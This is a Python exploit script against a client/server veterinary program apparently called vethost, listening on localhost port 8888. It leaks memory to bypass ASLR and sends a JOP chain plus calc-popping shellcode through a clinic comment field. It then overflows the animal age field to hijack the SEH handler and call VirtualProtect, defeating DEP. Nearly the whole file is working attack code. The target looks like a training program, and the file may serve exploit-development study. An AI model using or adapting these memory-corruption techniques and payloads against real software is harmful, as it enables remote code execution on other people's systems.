import struct
import os
import sys
import socket
from time import sleep

"""
This file exploits an address leak from a client/server veterinary application to bypass ASLR.
DEP is defeat with a JOP chain
"""
TO_BASE = 14480
IP = '127.0.0.1'
shellcode =  b""
shellcode +=  b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
shellcode +=  b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
shellcode +=  b"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
shellcode +=  b"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
shellcode +=  b"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
shellcode +=  b"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
shellcode +=  b"\x45\x81\x3e\x43\x72\x65\x61\x75"
shellcode +=  b"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
shellcode +=  b"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
shellcode +=  b"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
shellcode +=  b"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
shellcode +=  b"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
shellcode +=  b"\x6c\x63\x89\xe2\x52\x52\x53\x53"
shellcode +=  b"\x53\x53\x53\x53\x52\x53\xff\xd7"
# Shellcode is calc from packet-storm

def create_jop_chain(baseaddr, heapaddr):
	"""
	This function generates a JOP chain which will be stuffed into a clinic's comments
	Offsets are decimal with hex in comments
	"""

	jop_gadgets = [
		0x56565656,
		0x56565656,
		0x56565656,
		0x56565656,
		baseaddr + 5069, # pop esi				0x110013cd (offset 0x13cd) jmp ecx				0x110013ce (offset 0x13ce)
		0x56565656,
		0x56565656,
		0x56565656,
		baseaddr + 9591 # jmp dword ptr [esi]				0x11002577 (offset 0x2577)
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

def send(payload):
	"""
	This function sends a string to the vethost program and receives data back
	"""
	sleep(.25)
	socket.send(payload)
	return socket.recv(1024)

def getBaseAddr():
	"""
	This function generates a memory leak within the vethost program
	By deleting an animal and then doing a quick add, the deleted animal is still displayed
	Leaked memory includes:
	  - a pointer to the animal.toString() function which is used to calculate the base addess
	  - a pointer to an animal in the heap
	"""
	print "[*] Generating memory leak"
	payloads = [
		"a\n", # enter animal menu
		"OK\n",
		"d\n", # delete an animal
		"0\n", # delete 0
		"OK",
		"Y\n", # confirm
		"OK\n",
		"X\n", # back to main
		"OK\n",
		"q\n", # quick add/delete
		"OK\n",
		"1\n", # 1 animals
		"1\n", # 1 clinics
		"OK\n",
		"-1\n", # don't delete any animals
		"OK\n",
		"-1\n", # don't delete any clinics
		"OK\n",
		"\n", # ack summary page
		"OK\n" # back to main menu
	]
	for payload in payloads:
		data = send(payload)
		if "ANIMALS" in data:
			if "CLINICS" in data:
				disclosed_base = int(data.split()[9]) # animalToString() function location
				disclosed_heap = int(data.split()[13]) # heapBuf

	hexbased = hex(disclosed_base)
	intbase = int(hexbased, base=16)
	baseaddress = intbase - TO_BASE
	hexbase = hex(baseaddress)
	hexheap = hex(disclosed_heap)
	clinicheap = hex(disclosed_heap - 1116)
	clinicaddr = int(clinicheap, base=16)
	print "  [+] Leaked address {0} or {1}".format(intbase, hexbased)
	print "  [+] Base address is {0} or {1}".format(baseaddress, hexbase)
	print "  [+] Disclosed heap address is {0}. Our clinic will be at {1}".format(hexheap, clinicheap)
	return baseaddress, clinicaddr

def addcomment(jop_gadgets):
	"""
	This function submits a "Comment" to a clinic. This data includes:
		- A JOP Chain to set up a call to VirtualProtect
		- Shellcode
	"""
	print "[*] Adding JOP gadgets to clinic 0's comments field"
	payloads = [
		"c\n",
		"OK\n",
		"e\n",
		"0\n",
		"OK\n",
		"5\n",
		jop_gadgets + "\x90" * 4 + shellcode,
		"OK\n",
		"0\n",
		"OK\n",
		"x\n",
		"OK\n"
	]
	for payload in payloads:
		send(payload)
	print "  [+] JOP gadgets added"

def overflow(baseaddr, heapaddr, jop_gadgets):
	"""
	This function generates an exception at imagebase+432d
	If the right conditions are met, 0 gets moved into a memory address
	That address then gets dereferenced - since it is 0, it generates an exception
	We can overflow the stack to overwrite the exception handler and gain execution
	"""
	sp_offset = 10374 # 0x109b2886 : {pivot 8584 / 0x2188} :  # ADD ESP,2188 # RETN    ** [vethost.exe] **   |   {PAGE_EXECUTE_READ}
	writable_offset = 130015 # 1FBDF
	vp_pointer_offset = 98352 # 18030
	dispatcher_offset = 86242 # 0x150e2, add ebx, 0x10; jmp dword ptr [ebx]

	"""
	Dispatcher table: put into EBX the heap location
	add ebx, 0x10				0x110150e2 (offset 0x150e2)
	jmp dword ptr [ebx]				0x110150e5 (offset 0x150e5)

	Dispatcher: put into ECX pointer to dispatch table
	pop ecx				0x1100274f (offset 0x274f) => dispatcher_offset
	pop ebx				0x11002750 (offset 0x2750) => heap
	jmp ecx				0x11002751 (offset 0x2751)
	"""
	jop_start = struct.pack('<I', baseaddr + 10063) # 0x274f pop ecx, pop ebx, jmp ecx
	jop_start += struct.pack('<I', baseaddr + 86242) # 0x150e2 add ebx, 0x10; jmp dword ptr [ebx]
	jop_start += struct.pack('<I', heapaddr) # location of JOP gadgets and shellcode

	vp_stack = struct.pack('<I', baseaddr + vp_pointer_offset)
	vp_stack += struct.pack('<I', heapaddr + len(jop_gadgets)) # return to heap where shellcode is
	vp_stack += struct.pack('<I', heapaddr + len(jop_gadgets)) # lpAddress
	vp_stack += struct.pack('<I', 0x201) # dwSize
	vp_stack += struct.pack('<I', 0x40) # flNewProtect
	vp_stack += struct.pack('<I', baseaddr + writable_offset) # lpflOldProtect

	print "[*] Generating overflow of an age"
	junk = 'A' * 309
	seh = struct.pack('<L', baseaddr + sp_offset)
	print "  [*] SEH will be set to {0}".format(hex(baseaddr + sp_offset))
	payload = junk + seh + ('C'*24) + jop_start + vp_stack + "\x90" * 409

	socket.sendall("a\n") # enter animal menu
	data = socket.recv(500) # clear
	socket.sendall("OK\n")
	data = socket.recv(500) # animal menu
	socket.sendall("e\n") # edit an animal
	data = socket.recv(500) # index to edit
	socket.sendall("1\n") # animal 1
	data = socket.recv(500) # clear
	socket.sendall("OK")
	data = socket.recv(500) # what to do with animal
	socket.sendall("4\n") # 0x4abc
	data = socket.recv(500) # enter age
	print "[+] Triggering overflow with a payload of {0}".format(len(payload))
	socket.sendall(payload)
	data = socket.recv(500) # clear twice
	socket.sendall("OK")
	socket.sendall("OK")
	print "[!] All done"

socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
socket.connect((IP , 8888))
print "[+] Connected to vetHost"
data = socket.recv(40) # You have been connected + CLEAR
socket.sendall("OK")
data = socket.recv(500) # main menu

baseaddr, heapaddr = getBaseAddr()
jop_gadgets = create_jop_chain(baseaddr, heapaddr)
addcomment(jop_gadgets)
overflow(baseaddr, heapaddr, jop_gadgets)

socket.close();
